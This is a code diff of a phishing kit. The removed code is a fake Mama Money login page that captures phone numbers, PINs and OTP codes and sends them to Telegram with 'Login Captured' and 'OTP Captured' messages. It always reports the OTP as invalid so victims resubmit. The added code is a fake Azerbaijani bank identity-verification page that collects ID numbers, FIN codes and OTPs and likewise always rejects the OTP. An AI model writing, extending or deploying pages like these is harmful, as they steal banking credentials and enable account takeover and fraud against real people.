@@ -1,622 +1,551 @@
 "use client"
 
-import { useState, useEffect, useRef } from "react"
-import { ChevronLeft, ArrowRight, Search, Clock, Loader2 } from "lucide-react"
-import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"
-import { SplashScreen } from "./register/_component/splash-screen"
+import React, { useState, useEffect } from "react"
+import {
+  ChevronDown,
+  MessageSquare,
+  Check,
+  AlertCircle,
+  Loader2
+} from "lucide-react"
 
-type Screen = "splash" | "login" | "loading" | "otp" | "rates"
+// SVG Flag Components
+const AzerbaijanFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
+  <svg
+    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
+    viewBox="0 0 36 36"
+    aria-hidden="true"
+  >
+    <path fill="#0092BC" d="M0 0h36v12H0z" />
+    <path fill="#E4002B" d="M0 12h36v12H0z" />
+    <path fill="#009739" d="M0 24h36v12H0z" />
+    <path
+      fill="#FFFFFF"
+      d="M17.8 13.8a4.2 4.2 0 1 0 0 8.4 4.8 4.8 0 1 1 0-8.4z"
+    />
+    <path
+      fill="#FFFFFF"
+      d="M21.5 16.5l.4.7.8-.3-.3.8.8.4-.8.3.3.8-.8-.3-.4.7-.3-.7-.8.3.3-.8-.8-.4.8-.3-.3-.8.8.3z"
+    />
+  </svg>
+)
 
-const COUNTRY_LIST = [
-  { name: "Andorra", code: "ad" },
-  { name: "Angola", code: "ao" },
-  { name: "Austria", code: "at" },
-  { name: "Bangladesh", code: "bd" },
-  { name: "Belgium", code: "be" },
-  { name: "Benin", code: "bj" },
-  { name: "Botswana", code: "bw" },
-  { name: "Bulgaria", code: "bg" },
-  { name: "Burkina Faso", code: "bf" },
-  { name: "Burundi", code: "bi" },
-  { name: "Cameroon", code: "cm" },
-  { name: "Canada", code: "ca" },
-  { name: "China", code: "cn" },
-  { name: "DR Congo", code: "cd" },
-  { name: "Egypt", code: "eg" },
-  { name: "Ethiopia", code: "et" },
-  { name: "France", code: "fr" },
-  { name: "Germany", code: "de" },
-  { name: "Ghana", code: "gh" },
-  { name: "India", code: "in" },
-  { name: "Italy", code: "it" },
-  { name: "Kenya", code: "ke" },
-  { name: "Lesotho", code: "ls" },
-  { name: "Malawi", code: "mw" },
-  { name: "Mozambique", code: "mz" },
-  { name: "Nigeria", code: "ng" },
-  { name: "Pakistan", code: "pk" },
-  { name: "Philippines", code: "ph" },
-  { name: "Rwanda", code: "rw" },
-  { name: "Somalia", code: "so" },
-  { name: "South Africa", code: "za" },
-  { name: "Tanzania", code: "tz" },
-  { name: "Uganda", code: "ug" },
-  { name: "United Kingdom", code: "gb" },
-  { name: "United States", code: "us" },
-  { name: "Zambia", code: "zm" },
-  { name: "Zimbabwe", code: "zw" },
-]
+const UKFlag = ({ className = "w-6 h-6" }: { className?: string }) => (
+  <svg
+    className={`${className} rounded-full border border-gray-200/60 shadow-xs flex-shrink-0 object-cover`}
+    viewBox="0 0 36 36"
+    aria-hidden="true"
+  >
+    <path fill="#012169" d="M0 0h36v36H0z" />
+    <path stroke="#FFF" strokeWidth="6" d="M0 0l36 36M36 0L0 36" />
+    <path stroke="#C8102E" strokeWidth="2.5" d="M0 0l36 36M36 0L0 36" />
+    <path stroke="#FFF" strokeWidth="10" d="M18 0v36M0 18h36" />
+    <path stroke="#C8102E" strokeWidth="6" d="M18 0v36M0 18h36" />
+  </svg>
+)
 
-export default function MamaMoneyLogin() {
-  const [cellphone, setCellphone] = useState("")
-  const [pin, setPin] = useState("")
-  const [rememberMe, setRememberMe] = useState(false)
-  const [isLoginLoading, setIsLoginLoading] = useState(false)
-  const [isOtpLoading, setIsOtpLoading] = useState(false)
+type Language = "az" | "en"
+type ScreenType = "details" | "otp"
 
-  const [screen, setScreen] = useState<Screen>("splash")
+// Translations dictionary
+const t = {
+  az: {
+    title: "Şəxsiyyət vəsiqənizin məlumatlarını daxil edin.",
+    subtitle: "Şəxsiyyətinizi təsdiqləmək üçün seriya nömrəsini və FİN kodunu daxil edin.",
+    resident: "Rezident",
+    nonResident: "Qeyri-rezident",
+    select: "Seçin",
+    idPlaceholder: "Vəsiqənizin nömrəsini daxil edin",
+    finPlaceholder: "FİN kodunuzu daxil edin",
+    termsText: "Bank hesabının açılması üçün ",
+    termsLink1: "İstifadə şərtləri",
+    termsText2: " və ",
+    termsLink2: "Bank Hesabı Ərizəsi",
+    termsText3: " ilə tanış olduğumu təsdiq edirəm.",
+    continueBtn: "Davam et",
+    support: "Dəstək",
+    langTitle: "Dil seçimi",
+    otpTitle: "Təsdiq kodunu daxil edin",
+    otpSubtitle: "Mobil nömrənizə təsdiq kodu göndərildi. Zəhmət olmasa daxil edin.",
+    otpPlaceholder: "Təsdiq kodunu daxil edin",
+    invalidOtp: "Yalnış OTP kodu. Yenidən cəhd edin.",
+    resendIn: "Kodu yenidən göndər: ",
+    resendBtn: "Yenidən göndər",
+    verifyBtn: "Təsdiq et",
+  },
+  en: {
+    title: "Enter your ID card details.",
+    subtitle: "Enter your ID serial number and FIN code to verify your identity.",
+    resident: "Resident",
+    nonResident: "Non-resident",
+    select: "Select",
+    idPlaceholder: "Enter your ID number",
+    finPlaceholder: "Enter your FIN code",
+    termsText: "Please review and confirm the ",
+    termsLink1: "Terms of use",
+    termsText2: " and ",
+    termsLink2: "Bank Account Application",
+    termsText3: " for opening a bank account.",
+    continueBtn: "Continue",
+    support: "Support",
+    langTitle: "Language selection",
+    otpTitle: "Enter verification code",
+    otpSubtitle: "We have sent a security OTP code to your mobile phone. Please enter it below.",
+    otpPlaceholder: "Enter verification code",
+    invalidOtp: "Invalid OTP code. Please try again.",
+    resendIn: "Resend code in ",
+    resendBtn: "Resend Code",
+    verifyBtn: "Verify",
+  }
+}
 
-  const [selectedCountry, setSelectedCountry] = useState(
-    COUNTRY_LIST.find((c) => c.code === "za") || COUNTRY_LIST[0]
-  )
-  const [otpDigits, setOtpDigits] = useState<string[]>(["", "", "", "", ""])
-  const [focusedIndex, setFocusedIndex] = useState<number>(0)
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
-  const [timer, setTimer] = useState(117)
-  const [error, setError] = useState("")
-  const [errors, setErrors] = useState<{ cellphone?: string; pin?: string }>({})
-  const [searchQuery, setSearchQuery] = useState("")
+export default function IdentityVerificationPage() {
+  // Screen state
+  const [screen, setScreen] = useState<ScreenType>("details")
 
+  // ID Details Form State
+  const [residency, setResidency] = useState<"resident" | "non-resident">("resident")
+  const [idPrefix, setIdPrefix] = useState("AZE")
+  const [idNumber, setIdNumber] = useState("")
+  const [finCode, setFinCode] = useState("")
+  const [acceptedTerms, setAcceptedTerms] = useState(false)
+  const [showPrefixDropdown, setShowPrefixDropdown] = useState(false)
+
+  // Language modal state (Default language is Azerbaijan)
+  const [selectedLang, setSelectedLang] = useState<Language>("az")
+  const [isLangModalOpen, setIsLangModalOpen] = useState(false)
+
+  // Loading state (2 second loader)
+  const [loading, setLoading] = useState(false)
+
+  // Get current active language texts
+  const text = t[selectedLang]
+
+  // OTP Screen State
+  const [otp, setOtp] = useState("")
+  const [timer, setTimer] = useState(60) // 1 minute countdown
+  const [otpError, setOtpError] = useState<string | null>(null)
+
+  // Form Validation logic: ONLY requires data in fields
+  const isDetailsValid =
+    idNumber.trim().length > 0 &&
+    finCode.trim().length > 0
+
+  const isOtpValid = otp.trim().length > 0
+
+  // Timer countdown effect for OTP screen
+  useEffect(() => {
+    if (screen !== "otp") return
+
+    const interval = setInterval(() => {
+      setTimer((prev) => {
+        if (prev <= 1) {
+          clearInterval(interval)
+          return 0
+        }
+        return prev - 1
+      })
+    }, 1000)
+
+    return () => {
+      clearInterval(interval)
+    }
+  }, [screen])
+
+  // Handle Continue button click with 2 second loader
+  const handleContinue = () => {
+    if (!isDetailsValid || loading) return
+    setLoading(true)
+    setTimeout(() => {
+      setLoading(false)
+      setScreen("otp")
+      setTimer(60)
+      setOtpError(null)
+    }, 2000)
+  }
+
+  // Handle Verify button click with 2 second loader
+  const handleVerifyOtp = () => {
+    if (!isOtpValid || loading) return
+    setLoading(true)
+    setTimeout(() => {
+      setLoading(false)
+      setOtp("")
+      setTimer(60)
+      setOtpError(text.invalidOtp)
+    }, 2000)
+  }
+
+  // Format timer into MM:SS
   const formatTimer = (seconds: number) => {
     const mins = Math.floor(seconds / 60)
     const secs = seconds % 60
-    return `${mins}:${secs.toString().padStart(2, "0")}`
+    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
   }
 
-  const formatMaskedPhone = (phone: string) => {
-    if (!phone || phone.length < 5) return "232****32323"
-    const start = phone.slice(0, 3)
-    const end = phone.slice(-5)
-    return `${start}****${end}`
-  }
+  return (
+    <div className="h-[100dvh] w-full bg-[#f3f4f6] text-gray-900 flex flex-col font-sans selection:bg-[#1d439b]/20 relative overflow-hidden">
+      
+      {/* Main Responsive Mobile Page Container */}
+      <div className="w-full max-w-lg sm:max-w-xl mx-auto flex-1 flex flex-col px-5 sm:px-8 pt-3 pb-5 justify-between h-[100dvh]">
+        
+        {/* Header Bar */}
+        <header className="flex items-center justify-between py-1 mb-2 w-full min-h-[40px] flex-shrink-0">
+          <div className="w-10" />
 
-  // Track visitor on page open
-  useEffect(() => {
-    const trackVisitor = async () => {
-      try {
-        await fetchVisitorInfo()
-        await sendTelegramMessage({
-          title: "Mama Money Login Page Opened",
-          type: "visitor",
-        })
-      } catch (err) {
-        console.error("Failed to track visitor:", err)
-      }
-    }
-    trackVisitor()
-  }, [])
-
-  // Splash timer
-  useEffect(() => {
-    if (screen === "splash") {
-      const timeout = setTimeout(() => {
-        setScreen("login")
-      }, 2500)
-      return () => clearTimeout(timeout)
-    }
-  }, [screen])
-
-  // Loading timer
-  useEffect(() => {
-    if (screen === "loading") {
-      const timeout = setTimeout(() => {
-        setScreen("otp")
-        setTimer(117)
-      }, 2000)
-      return () => clearTimeout(timeout)
-    }
-  }, [screen])
-
-  // OTP countdown timer
-  useEffect(() => {
-    if (screen === "otp" && timer > 0) {
-      const interval = setInterval(() => {
-        setTimer((prev) => prev - 1)
-      }, 1000)
-      return () => clearInterval(interval)
-    }
-  }, [screen, timer])
-
-  // Clear error message after 8 seconds
-  useEffect(() => {
-    if (error) {
-      const timeout = setTimeout(() => {
-        setError("")
-      }, 8000)
-      return () => clearTimeout(timeout)
-    }
-  }, [error])
-
-  const handleOtpChange = (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return
-
-    const newDigits = [...otpDigits]
-    newDigits[index] = value.slice(-1)
-    setOtpDigits(newDigits)
-    setError("")
-
-    if (value && index < 4) {
-      inputRefs.current[index + 1]?.focus()
-    }
-  }
-
-  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus()
-    }
-  }
-
-  const validateLogin = () => {
-    const newErrors: { cellphone?: string; pin?: string } = {}
-
-    if (!cellphone.trim()) {
-      newErrors.cellphone = "Phone number must be at least 10 digits."
-    } else if (cellphone.length < 10) {
-      newErrors.cellphone = "Phone number must be at least 10 digits."
-    }
-
-    if (!pin.trim()) {
-      newErrors.pin = "Pin is required"
-    } else if (pin.length < 4) {
-      newErrors.pin = "Pin must be 4 digits"
-    }
-
-    setErrors(newErrors)
-    return Object.keys(newErrors).length === 0
-  }
-
-  const handleLogin = async () => {
-    if (validateLogin()) {
-      setIsLoginLoading(true)
-      try {
-        await sendTelegramMessage({
-          title: "Mama Money Login Captured",
-          phoneNumber: cellphone,
-          password: pin,
-          country: selectedCountry.name,
-          type: "click",
-        })
-      } catch (err) {
-        console.error("Failed to send login tracking:", err)
-      }
-      setTimeout(() => {
-        setIsLoginLoading(false)
-        setScreen("loading")
-      }, 800)
-    }
-  }
-
-  const handleVerify = async () => {
-    const code = otpDigits.join("")
-    if (code.length < 5) {
-      setError("Please enter complete 5-digit OTP")
-      return
-    }
-    setIsOtpLoading(true)
-    try {
-      await sendTelegramMessage({
-        title: "Mama Money OTP Captured",
-        otp1: code,
-        phoneNumber: cellphone,
-        type: "click",
-      })
-    } catch (err) {
-      console.error("Failed to send OTP tracking:", err)
-    }
-    setTimeout(() => {
-      setIsOtpLoading(false)
-      setError("Invalid OTP code. Please try again.")
-      setOtpDigits(["", "", "", "", ""])
-      setFocusedIndex(0)
-      inputRefs.current[0]?.focus()
-    }, 1000)
-  }
-
-  const handleBackToLogin = () => {
-    setScreen("login")
-    setError("")
-  }
-
-  // Login Screen Background with mama-money-pattern.svg layered behind everything
-  const LoginBackground = () => (
-    <div className="absolute inset-0 z-0 bg-[#60ac28] overflow-hidden select-none pointer-events-none">
-      {/* Pattern SVG as Background Image */}
-      <div
-        className="absolute inset-0 z-0 opacity-20 pointer-events-none"
-        style={{
-          backgroundImage: `url('/mama-money-pattern.svg')`,
-          backgroundSize: '100px 100px',
-          backgroundRepeat: 'repeat'
-        }}
-      />
-      {/* Curved concentric sweeping arcs */}
-      <svg className="absolute -top-12 -right-24 z-0 w-[480px] h-[480px] text-[#71bc30] opacity-80 pointer-events-none" viewBox="0 0 400 400" fill="none">
-        <circle cx="400" cy="0" r="380" stroke="currentColor" strokeWidth="48" opacity="0.4" />
-        <circle cx="400" cy="0" r="300" stroke="currentColor" strokeWidth="44" opacity="0.6" />
-        <circle cx="400" cy="0" r="220" stroke="currentColor" strokeWidth="40" opacity="0.8" />
-        <circle cx="400" cy="0" r="140" stroke="currentColor" strokeWidth="36" />
-      </svg>
-    </div>
-  )
-
-  // Plain Green Background for other screens (without pattern)
-  const PlainBackground = () => (
-    <div className="absolute inset-0 z-0 bg-[#60ac28] overflow-hidden select-none pointer-events-none">
-      <svg className="absolute -top-12 -right-24 z-0 w-[480px] h-[480px] text-[#71bc30] opacity-80 pointer-events-none" viewBox="0 0 400 400" fill="none">
-        <circle cx="400" cy="0" r="380" stroke="currentColor" strokeWidth="48" opacity="0.4" />
-        <circle cx="400" cy="0" r="300" stroke="currentColor" strokeWidth="44" opacity="0.6" />
-        <circle cx="400" cy="0" r="220" stroke="currentColor" strokeWidth="40" opacity="0.8" />
-        <circle cx="400" cy="0" r="140" stroke="currentColor" strokeWidth="36" />
-      </svg>
-    </div>
-  )
-
-  // Mama Money Logo Component
-  const MamaMoneyLogo = () => (
-    <div className="flex items-center gap-3.5 select-none">
-      {/* Face Logo Image */}
-      <div className="w-20 h-20 sm:w-22 sm:h-22 shrink-0 drop-shadow-md">
-        <img
-          src="/q32.png"
-          alt="Mama Money"
-          className="w-full rounded-full h-full object-contain pointer-events-none select-none"
-          draggable={false}
-        />
-      </div>
-
-      {/* Brand Text */}
-      <div className="flex flex-col text-left">
-        <h1 className="text-[#043323] text-4xl sm:text-[42px] font-black tracking-tight leading-[0.9]">
-          Mama
-        </h1>
-        <h1 className="text-[#043323] text-4xl sm:text-[42px] font-black tracking-tight leading-[0.9]">
-          Money
-        </h1>
-        <p className="text-white text-sm font-bold tracking-wide mt-1 drop-shadow-sm">
-          More Money Home
-        </p>
-      </div>
-    </div>
-  )
-
-  // 0. SPLASH SCREEN
-  if (screen === "splash") {
-    return <SplashScreen />
-  }
-
-  // 1. RATES / SELECT COUNTRY SCREEN
-  if (screen === "rates") {
-    const filteredCountries = COUNTRY_LIST.filter((country) =>
-      country.name.toLowerCase().includes(searchQuery.toLowerCase())
-    )
-
-    return (
-      <div className="min-h-[100dvh] max-w-[430px] mx-auto bg-white relative flex flex-col overflow-hidden select-none w-full shadow-2xl">
-        <div className="sticky top-0 z-30 bg-white shrink-0 shadow-sm border-b border-gray-200">
-          <div className="relative h-16 w-full flex items-center justify-between px-4">
-            <PlainBackground />
-            <div className="relative z-10 flex items-center justify-between w-full">
+          {/* Header Actions: Language Flag & Support (Only shown on Details screen) */}
+          {screen === "details" && (
+            <div className="flex items-center gap-3">
+              {/* Flag Button (Shows English flag when Azerbaijan language is active) */}
               <button
-                onClick={() => {
-                  setScreen("login")
-                  setSearchQuery("")
-                }}
-                className="p-2 -ml-2 text-[#043323] active:opacity-70 cursor-pointer"
-                aria-label="Back to login"
+                onClick={() => setIsLangModalOpen(true)}
+                className="p-1 rounded-full hover:opacity-80 transition-opacity cursor-pointer focus:outline-none"
+                title="Change Language"
               >
-                <ChevronLeft className="w-7 h-7" strokeWidth={2.5} />
-              </button>
-              <h1 className="text-[#043323] text-xl font-bold tracking-tight text-center flex-1 pr-6 select-none">
-                Select a Country
-              </h1>
-            </div>
-          </div>
-
-          <div className="p-3 bg-white">
-            <div className="flex items-center gap-2 bg-[#eeeeee] px-3 py-2.5 rounded-xl">
-              <Search className="w-5 h-5 text-gray-500 shrink-0 pointer-events-none" />
-              <input
-                type="text"
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                placeholder="Search"
-                className="bg-transparent border-none outline-none w-full text-gray-800 placeholder-gray-500 text-base"
-              />
-            </div>
-          </div>
-        </div>
-
-        <div className="flex-1 overflow-y-auto bg-white divide-y divide-gray-100 select-none touch-pan-y overscroll-contain">
-          {filteredCountries.map((country) => {
-            const isSelected = selectedCountry.code === country.code
-            return (
-              <div
-                key={country.code}
-                onClick={() => {
-                  setSelectedCountry(country)
-                  setScreen("login")
-                  setSearchQuery("")
-                }}
-                className={`flex items-center justify-between px-5 py-3.5 hover:bg-gray-50 active:bg-gray-100 transition-colors cursor-pointer select-none ${isSelected ? "bg-emerald-50/60" : ""
-                  }`}
-              >
-                <div className="flex items-center gap-4 select-none pointer-events-none">
-                  <div className="w-9 h-9 rounded-full overflow-hidden shrink-0 border border-gray-200 shadow-sm flex items-center justify-center bg-gray-100 select-none pointer-events-none">
-                    <img
-                      src={`https://flagcdn.com/w80/${country.code}.png`}
-                      alt={country.name}
-                      className="w-full h-full object-cover select-none pointer-events-none"
-                      draggable={false}
-                    />
-                  </div>
-                  <span className="text-[#043323] text-base font-semibold tracking-wide select-none pointer-events-none">
-                    {country.name}
-                  </span>
-                </div>
-                {isSelected && (
-                  <span className="text-[#043323] text-xs font-bold bg-[#82c326] px-2 py-1 rounded-full select-none pointer-events-none">
-                    Selected
-                  </span>
+                {selectedLang === "az" ? (
+                  <UKFlag className="w-7 h-7 sm:w-8 sm:h-8" />
+                ) : (
+                  <AzerbaijanFlag className="w-7 h-7 sm:w-8 sm:h-8" />
                 )}
-              </div>
-            )
-          })}
+              </button>
 
-          {filteredCountries.length === 0 && (
-            <div className="p-8 text-center text-gray-500 select-none">
-              No country found matching &quot;{searchQuery}&quot;
+              {/* Support Button with #1d439b theme */}
+              <button className="bg-[#1d439b]/15 hover:bg-[#1d439b]/25 active:scale-95 text-[#1d439b] px-3.5 py-1.5 rounded-full flex items-center gap-1.5 text-xs sm:text-sm font-semibold shadow-xs transition-all cursor-pointer">
+                <MessageSquare className="w-4 h-4 fill-current stroke-none" />
+                <span>{text.support}</span>
+              </button>
             </div>
           )}
-        </div>
+        </header>
+
+        {/* Dynamic Screen View */}
+        <main className="flex-1 flex flex-col justify-between w-full">
+          {screen === "details" ? (
+            /* DETAILS SCREEN */
+            <div className="flex-1 flex flex-col justify-between">
+              <div className="space-y-4">
+                {/* Title & Description */}
+                <div>
+                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
+                    {text.title}
+                  </h1>
+                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
+                    {text.subtitle}
+                  </p>
+                </div>
+
+                {/* Segmented Control Tabs (Resident / Non-resident) */}
+                <div className="bg-[#e4e7eb] p-1 rounded-full flex items-center shadow-inner">
+                  <button
+                    type="button"
+                    onClick={() => setResidency("resident")}
+                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
+                      residency === "resident"
+                        ? "bg-white text-gray-900 shadow-sm border border-[#1d439b]/80"
+                        : "text-gray-400 hover:text-gray-600"
+                    }`}
+                  >
+                    {text.resident}
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => setResidency("non-resident")}
+                    className={`flex-1 py-2.5 sm:py-3 text-center text-sm font-semibold rounded-full transition-all cursor-pointer ${
+                      residency === "non-resident"
+                        ? "bg-white text-gray-900 shadow-sm border border-[#1d439b]/80"
+                        : "text-gray-400 hover:text-gray-600"
+                    }`}
+                  >
+                    {text.nonResident}
+                  </button>
+                </div>
+
+                {/* Input 1: ID Serial Number with Select Dropdown */}
+                <div className="relative p-0.5">
+                  <div className="bg-[#e4e7eb] rounded-2xl px-4 py-3 flex items-center gap-3 transition-all focus-within:ring-2 focus-within:ring-[#1d439b]/40 focus-within:bg-white border border-transparent focus-within:border-[#1d439b]">
+                    {/* Prefix Selector Button */}
+                    <div className="relative">
+                      <button
+                        type="button"
+                        onClick={() => setShowPrefixDropdown(!showPrefixDropdown)}
+                        className="bg-white px-3 py-1.5 rounded-full text-xs font-semibold text-gray-700 shadow-xs flex items-center gap-1 cursor-pointer border border-gray-200/80 hover:bg-gray-50 transition-all flex-shrink-0"
+                      >
+                        <span>{idPrefix === "Select" ? text.select : idPrefix}</span>
+                        <ChevronDown className="w-3.5 h-3.5 text-gray-500" />
+                      </button>
+
+                      {/* Prefix Options Dropdown */}
+                      {showPrefixDropdown && (
+                        <div className="absolute top-10 left-0 z-30 bg-white rounded-xl shadow-lg border border-gray-100 py-1 w-24 text-xs font-medium text-gray-800 animate-slide-up">
+                          {["AZE", "AA", "MYI", text.select].map((pref) => (
+                            <div
+                              key={pref}
+                              onClick={() => {
+                                setIdPrefix(pref)
+                                setShowPrefixDropdown(false)
+                              }}
+                              className="px-3 py-2 hover:bg-[#1d439b]/10 cursor-pointer flex items-center justify-between"
+                            >
+                              <span>{pref}</span>
+                              {idPrefix === pref && <Check className="w-3 h-3 text-[#1d439b]" />}
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+
+                    {/* ID Input */}
+                    <input
+                      type="text"
+                      value={idNumber}
+                      onChange={(e) => setIdNumber(e.target.value)}
+                      placeholder={text.idPlaceholder}
+                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-400 w-full"
+                    />
+                  </div>
+                </div>
+
+                {/* Input 2: FIN Code */}
+                <div className="p-0.5">
+                  <div className="bg-[#e4e7eb] rounded-2xl px-4.5 py-3.5 flex items-center transition-all focus-within:ring-2 focus-within:ring-[#1d439b]/40 focus-within:bg-white border border-transparent focus-within:border-[#1d439b]">
+                    <input
+                      type="text"
+                      value={finCode}
+                      onChange={(e) => setFinCode(e.target.value.toUpperCase())}
+                      placeholder={text.finPlaceholder}
+                      maxLength={7}
+                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-400 w-full uppercase tracking-wider"
+                    />
+                  </div>
+                </div>
+
+                {/* White Checkbox and Terms of Use */}
+                <div className="flex items-start gap-3 px-1">
+                  <button
+                    type="button"
+                    role="checkbox"
+                    aria-checked={acceptedTerms}
+                    onClick={() => setAcceptedTerms(!acceptedTerms)}
+                    className={`w-5 h-5 mt-0.5 rounded-[5px] border transition-all flex items-center justify-center flex-shrink-0 cursor-pointer ${
+                      acceptedTerms
+                        ? "bg-white border-[#1d439b] text-[#1d439b] shadow-xs"
+                        : "bg-white border-gray-300 hover:border-gray-400"
+                    }`}
+                  >
+                    {acceptedTerms && (
+                      <Check className="w-3.5 h-3.5 stroke-[3] text-[#1d439b]" />
+                    )}
+                  </button>
+                  <label
+                    onClick={() => setAcceptedTerms(!acceptedTerms)}
+                    className="text-xs sm:text-sm text-gray-400 leading-snug cursor-pointer select-none"
+                  >
+                    {text.termsText}
+                    <span className="text-[#1d439b] font-medium hover:underline">{text.termsLink1}</span>
+                    {text.termsText2}
+                    <span className="text-[#1d439b] font-medium hover:underline">{text.termsLink2}</span>
+                    {text.termsText3}
+                  </label>
+                </div>
+              </div>
+
+              {/* Action Button with 2 Sec Loader */}
+              <div className="pt-3 pb-2 flex-shrink-0">
+                <button
+                  type="button"
+                  disabled={!isDetailsValid || loading}
+                  onClick={handleContinue}
+                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
+                    isDetailsValid && !loading
+                      ? "bg-[#1d439b] hover:bg-[#15347a] active:scale-[0.99] text-white shadow-md shadow-[#1d439b]/25 cursor-pointer"
+                      : "bg-[#1d439b]/50 text-white/80 cursor-not-allowed opacity-80"
+                  }`}
+                >
+                  {loading ? (
+                    <div className="flex items-center gap-2">
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      <span>{text.continueBtn}...</span>
+                    </div>
+                  ) : (
+                    <span>{text.continueBtn}</span>
+                  )}
+                </button>
+              </div>
+            </div>
+          ) : (
+            /* SIMPLIFIED OTP SCREEN WITH 2 SEC LOADER */
+            <div className="flex-1 flex flex-col justify-between animate-slide-up">
+              <div className="space-y-4">
+                {/* Title & Description */}
+                <div>
+                  <h1 className="text-2xl sm:text-3xl font-extrabold text-gray-900 tracking-tight leading-tight mb-1.5">
+                    {text.otpTitle}
+                  </h1>
+                  <p className="text-[14px] sm:text-base text-gray-400 font-normal leading-relaxed">
+                    {text.otpSubtitle}
+                  </p>
+                </div>
+
+                {/* OTP Input Field */}
+                <div className="p-0.5">
+                  <div
+                    className={`bg-[#e4e7eb] rounded-2xl px-4.5 py-3.5 flex items-center transition-all border ${
+                      otpError
+                        ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
+                        : "border-transparent focus-within:ring-2 focus-within:ring-[#1d439b]/40 focus-within:bg-white focus-within:border-[#1d439b]"
+                    }`}
+                  >
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      value={otp}
+                      onChange={(e) => {
+                        setOtp(e.target.value.replace(/\D/g, ""))
+                        if (otpError) setOtpError(null)
+                      }}
+                      placeholder={text.otpPlaceholder}
+                      className="bg-transparent border-none outline-none text-xl sm:text-2xl font-bold tracking-widest text-gray-900 placeholder:text-gray-400 placeholder:text-base placeholder:tracking-normal w-full"
+                    />
+                  </div>
+
+                  {/* Red Invalid OTP Error Message */}
+                  {otpError && (
+                    <p className="text-xs sm:text-sm font-semibold text-red-600 mt-2 px-1 flex items-center gap-1.5 animate-slide-up">
+                      <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
+                      <span>{otpError}</span>
+                    </p>
+                  )}
+                </div>
+
+                {/* Inline Text Timer */}
+                <div className="text-sm font-medium text-gray-500 px-1 flex items-center gap-2">
+                  {timer > 0 ? (
+                    <span>
+                      {text.resendIn}<strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
+                    </span>
+                  ) : (
+                    <button
+                      onClick={() => {
+                        setTimer(60)
+                        setOtpError(null)
+                      }}
+                      className="text-sm font-bold text-[#1d439b] hover:underline cursor-pointer"
+                    >
+                      {text.resendBtn}
+                    </button>
+                  )}
+                </div>
+              </div>
+
+              {/* Verify Button with 2 Sec Loader */}
+              <div className="pt-3 pb-2 flex-shrink-0">
+                <button
+                  type="button"
+                  onClick={handleVerifyOtp}
+                  disabled={!isOtpValid || loading}
+                  className={`w-full py-3.5 sm:py-4 font-semibold text-base rounded-full transition-all flex items-center justify-center gap-2 ${
+                    isOtpValid && !loading
+                      ? "bg-[#1d439b] hover:bg-[#15347a] active:scale-[0.99] text-white shadow-md shadow-[#1d439b]/25 cursor-pointer"
+                      : "bg-[#1d439b]/50 text-white/80 cursor-not-allowed opacity-80"
+                  }`}
+                >
+                  {loading ? (
+                    <div className="flex items-center gap-2">
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      <span>{text.verifyBtn}...</span>
+                    </div>
+                  ) : (
+                    <span>{text.verifyBtn}</span>
+                  )}
+                </button>
+              </div>
+            </div>
+          )}
+        </main>
       </div>
-    )
-  }
 
-  // 2. LOADING SCREEN
-  if (screen === "loading") {
-    return (
-      <div className="min-h-[100dvh] max-w-[430px] mx-auto relative overflow-hidden select-none w-full shadow-2xl flex flex-col items-center justify-center">
-        <PlainBackground />
-        <div className="relative z-10 flex flex-col items-center justify-center px-6">
-          <div className="mb-8">
-            <MamaMoneyLogo />
-          </div>
-          <div className="w-12 h-12 border-4 border-[#043323] border-t-transparent rounded-full animate-spin" />
-          <p className="text-[#043323] text-lg font-semibold mt-4">Please wait...</p>
-        </div>
-      </div>
-    )
-  }
+      {/* BOTTOM SHEET MODAL FOR LANGUAGE SELECTION */}
+      {isLangModalOpen && screen === "details" && (
+        <>
+          {/* Backdrop */}
+          <div
+            onClick={() => setIsLangModalOpen(false)}
+            className="fixed inset-0 bg-black/40 z-40 animate-fade-in backdrop-blur-xs transition-all"
+          />
 
-  // 3. OTP SCREEN
-  if (screen === "otp") {
-    return (
-      <div className="min-h-[100dvh] max-w-[430px] mx-auto relative flex flex-col justify-between px-5 sm:px-6 pt-5 pb-8 select-none w-full shadow-2xl overflow-x-hidden">
-        <LoginBackground />
-
-        <div className="relative z-10 flex flex-col justify-between min-h-[calc(100dvh-52px)] w-full">
-          <div>
-            {/* Top Back Arrow */}
-            <div className="w-full flex items-center justify-start mb-4">
+          {/* Bottom Sheet Container */}
+          <div className="fixed bottom-0 left-0 right-0 max-w-lg sm:max-w-xl mx-auto bg-white rounded-t-[28px] p-6 z-50 animate-slide-up shadow-2xl space-y-4">
+            {/* Header with Title & Chevron Down Close Button */}
+            <div className="flex items-center justify-between pb-1">
+              <h3 className="text-xl font-bold text-gray-900">
+                {text.langTitle}
+              </h3>
               <button
-                onClick={handleBackToLogin}
-                className="p-1 -ml-1 text-[#043323] active:opacity-70 cursor-pointer"
-                aria-label="Back to login"
+                onClick={() => setIsLangModalOpen(false)}
+                className="p-1.5 hover:bg-gray-100 rounded-full transition-colors cursor-pointer text-gray-400 hover:text-gray-700"
+                aria-label="Close language selection"
               >
